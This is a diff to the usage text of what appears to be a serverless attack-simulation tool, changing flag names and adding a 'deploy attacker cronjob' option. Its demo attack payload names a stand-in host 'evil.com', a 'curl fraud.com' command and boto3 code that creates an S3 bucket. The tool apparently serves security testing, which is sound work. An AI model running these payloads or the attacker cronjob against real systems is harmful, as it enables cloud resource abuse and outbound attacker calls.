@@ -21,12 +21,14 @@ optional arguments:
   -t THREADS, --threads THREADS      number of parallel threads (defualt: 32)
   -l LIMIT, --limit LIMIT            how many requests the send (default: 1000)
                         
-  -i INPUT, --input INPUT            Payload to create whitelist. Default is: 
+  -i INPUT, --input INPUT            payload to create whitelist. Default is: 
   {"mode": "whitelist", "payloads": {"host": "https://www.protego.io", "process": ["echo", "/tmp/file.txt"], "file": "/tmp/file.txt"}}
                    
-  -x ATTACK, --attack ATTACK         send attack payload
+  -a ATTACK, --attack ATTACK         send attack payload
   -d, --demo                         runs demo attack:
   {'mode': 'attack', 'payloads': {'code': 'import boto3\ns=boto3.client("s3")\nr=s.create_bucket(Bucket=free_bucket)\nprint(r)', 'host': 'evil.com', 'cmd': ["curl", "fraud.com"], 'file': '/tmp/target'}}
+  
+  -y, --deploy-attacker              deploy attacker chronjob
 ```
 
 ## To simulate attack, run (after whitelist was created):
